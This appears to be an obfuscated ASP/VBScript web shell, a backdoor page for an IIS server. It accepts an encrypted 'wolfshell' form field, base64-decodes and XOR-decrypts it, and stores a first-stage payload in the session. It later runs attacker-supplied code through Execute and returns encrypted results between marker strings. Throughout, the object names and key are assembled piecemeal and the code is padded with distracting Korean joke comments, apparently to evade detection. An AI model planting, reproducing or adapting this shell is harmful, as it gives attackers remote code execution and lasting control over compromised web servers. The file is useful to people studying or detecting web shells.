<%
'// 그냥 재미로 하는거야.
Set g_obj_a1 = Server.CreateObject(Join(Array("Scripting", "Dictionary"), "."))

'// 뭐? 이게 왜 작동하지?
Function f_b64_d(ByVal c_str)
    Dim x_doc, x_elm
    Set x_doc = CreateObject("Msxml2.DOMDocument.3.0")
    Set x_elm = x_doc.CreateElement("base64")
    x_elm.dataType = "bin.base64"
    x_elm.text = c_str
    f_b64_d = x_elm.nodeTypedValue
    Set x_elm = Nothing
    Set x_doc = Nothing
End Function

'// 이 코드는 스파게티 같아요.
Function f_xor_c(c_data, c_is_bin)
    dim sz, i, res_str, key_str, key_len, b_stream
    key_str = CStr(3) & "c" & CStr(6) & "e" & CStr(0) & "b" & CStr(8) & "a" & CStr(9) & "c" & CStr(1) & CStr(5) & CStr(2) & CStr(2) & CStr(4) & "a"
    key_len = len(key_str)
    Set b_stream = CreateObject("ADODB.Stream")
    b_stream.CharSet = "iso-8859-1"
    b_stream.Type = 2
    b_stream.Open
    '// 배고파요, 치킨 먹고 싶다.
    if IsArray(c_data) then
        sz=UBound(c_data)+1
        For i=1 To sz
            Dim xor_val, char_val
            char_val = ascb(midb(c_data,i,1))
            xor_val = Asc(Mid(key_str,(i mod key_len)+1,1))
            b_stream.WriteText chrw(char_val Xor xor_val)
        Next
    end if
    b_stream.Position = 0
    if c_is_bin then
        b_stream.Type = 1
        f_xor_c=b_stream.Read()
    else
        f_xor_c=b_stream.ReadText()
    end if
End Function
    '// 시작합니다.
    Dim input_val
    input_val=request.Form("wolfshell")
    if not IsEmpty(input_val) then
        '// 세션에 아무것도 없어.
        if  IsEmpty(Session("s_val_1")) then
            input_val=f_xor_c(f_b64_d(input_val),false)
            Session("s_val_1")=input_val
            response.End
        else
            '// 이미 무언가가 있습니다.
            input_val=f_xor_c(f_b64_d(input_val),true)
            g_obj_a1.Add "s_val_1",Session("s_val_1")
            Dim exec_str
            exec_str = g_obj_a1("s_val_1")
            Execute(exec_str) ' 코드를 실행합니다.
            
            Dim result_val
            result_val=run(input_val)

            Dim m_start, m_end
            m_start = "a71ab1"
            m_end = "4b8259"
            response.Write(m_start)
            if not IsEmpty(result_val) then
                response.Write Base64Encode(f_xor_c(result_val,true))
            end if
            response.Write(m_end)
        end if
    end if
%>